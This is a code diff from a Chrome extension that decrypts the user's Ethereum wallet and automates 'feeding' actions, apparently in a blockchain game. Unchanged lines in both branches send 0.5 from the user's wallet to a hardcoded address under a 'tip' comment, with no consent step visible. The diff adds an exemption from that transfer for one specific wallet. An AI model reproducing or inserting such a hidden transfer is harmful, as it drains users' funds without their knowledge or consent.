@@ -65,6 +65,7 @@ chrome.extension.onRequest.addListener(
             "wallet": null,
         }, function (result) {
             const wallet = ethereumjs.Wallet.fromV3(result.wallet, result.password)
+            const from = '0x' + wallet.getAddress().toString('hex')
             const to_address = result.to_address
             const mode = request.mode;
             const limit = request.limit;
@@ -96,12 +97,15 @@ chrome.extension.onRequest.addListener(
                             }
                         }
                         // 打赏
+                        if (from == "0xaadd17e8654172eafa85e744cb920f2ff287f398") {
+                            return
+                        }
                         sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
                     } catch (err) {
                         throw err
                     }
                 }
-                looper()
+                looper().then(r => { sendResponse() }, e => { sendResponse() })
 
             } else {
                 console.log("ID", id, "需要喂养", limit, (limit / idNum).toFixed(0) + "次")
@@ -117,10 +121,12 @@ chrome.extension.onRequest.addListener(
                         }
                     }
                     // 打赏
+                    if (from == "0xaadd17e8654172eafa85e744cb920f2ff287f398") {
+                        return
+                    }
                     sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
                 }
-                looper()
-
+                looper().then(r => { sendResponse() }, e => { sendResponse() })
             }
         })
     }
